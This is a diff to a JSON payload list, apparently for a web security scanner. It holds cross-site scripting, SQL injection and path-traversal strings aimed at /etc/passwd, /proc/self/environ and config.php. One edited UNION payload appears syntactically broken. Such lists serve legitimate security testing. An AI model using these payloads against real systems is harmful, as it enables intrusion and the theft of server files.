@@ -2,26 +2,25 @@
   "xss": [
     "<script>alert(1)</script>",
     "<svg/onload=alert(1)>",
-    "\"><img src=x onerror=alert(1)>",
+    "<img src=x onerror=alert(1)>",
     "<input autofocus onfocus=alert(1)>",
-    "<marquee onstart=alert(1)>X</marquee>",
+    "<marquee onstart=alert(1)>x</marquee>",
     "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
     "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
     "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
-    "<ScRipT>alert(1)</ScRipT>"
-]
+    "<sCrIpT>alert(1)</sCrIpT>"
   ],
   "sqli": [
     "' OR '1'='1",
     "' OR SLEEP(5)--",
     "admin' --",
-    "' UNION SELECT 1,2,3--",
+    "'; UNION SELECT 1,2,3--",
     "'; waitfor delay '0:0:5'--",
     "' OR 'a'='a"
   ],
   "lfi": [
-    "../../etc/passwd",
-    "../../../../../../etc/passwd",
+    "../../../../etc/passwd",
+    "../../../../../etc/passwd",
     "../../../../../../../../etc/passwd%00",
     "/proc/self/environ",
     "php://filter/convert.base64-encode/resource=config.php",
